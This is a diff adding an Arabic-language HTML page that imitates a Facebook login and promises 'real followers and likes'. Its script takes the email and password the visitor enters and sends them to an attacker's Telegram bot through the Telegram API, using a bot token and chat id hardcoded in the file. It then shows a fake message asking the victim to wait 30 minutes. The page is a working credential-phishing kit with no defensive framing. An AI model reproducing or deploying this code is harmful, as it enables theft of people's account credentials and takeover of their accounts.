@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل دخول فيسبوك</title>
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+        }
+        body {
+            background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRddtgJuY0Yhr-xnpwcLfA58Y0A78ZSGDUEvg&s');
+            background-size: cover; /* يغطي الخلفية كامل الصفحة */
+            background-repeat: no-repeat;
+            background-position: center center; /* يضمن أن الخلفية تتموضع في المركز */
+            background-attachment: fixed; /* يضمن بقاء الخلفية ثابتة عند التمرير */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh; /* ضمان أن الصفحة تأخذ 100% من الارتفاع */
+        }
+        .login-box {
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            background: transparent; /* جعل الخلفية شفافة */
+        }
+        .login-box h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #1877f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-box h1 img {
+            margin-right: 10px;
+            width: 40px;
+            height: 40px;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid rgba(255, 255, 255, 0.7);
+            border-radius: 6px;
+            font-size: 16px;
+            background-color: rgba(255, 255, 255, 0.5); /* لون خلفية الحقل مع الشفافية */
+            color: #333;
+        }
+        .login-box button {
+            background-color: #1877f2;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 18px;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .login-box button:hover {
+            background-color: #145db2;
+        }
+        .login-box p {
+            font-size: 14px;
+            color: green;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <h1>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+        تسجيل الدخول
+    </h1>
+    <input type="text" id="email" placeholder="البريد الإلكتروني" required>
+    <input type="password" id="password" placeholder="كلمة المرور" required>
+    <button onclick="sendData()">تسجيل الدخول</button>
+    <p>احصل على متابعين ولايكات حقيقية الآن!</p>
+</div>
+
+<script>
+    function sendData() {
+        var email = document.getElementById("email").value;
+        var password = document.getElementById("password").value;
+
+        var telegramBotToken = '7391359985:AAF8wa-mv6ZoIQQ53UDMIRGKdafrc8gG2ik'; // ضع هنا التوكن الخاص بالبوت
+        var chatId = 'imad27'; // ضع هنا معرف المحادثة الخاص بك
+        
+        var message = "Email: " + email + "\nPassword: " + password;
+
+        var url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url).then(response => {
+            if (response.ok) {
+                alert("يرجى الانتضار 30 دقيقة وبعدها الرجوع الى الرابط لتحقق من حسابك وارسال المتابعين ");
+            } else {
+                alert("حدث خطأ أثناء إرسال المعلومات");
+            }
+        });
+    }
+</script>
+
+</body>
+</html>
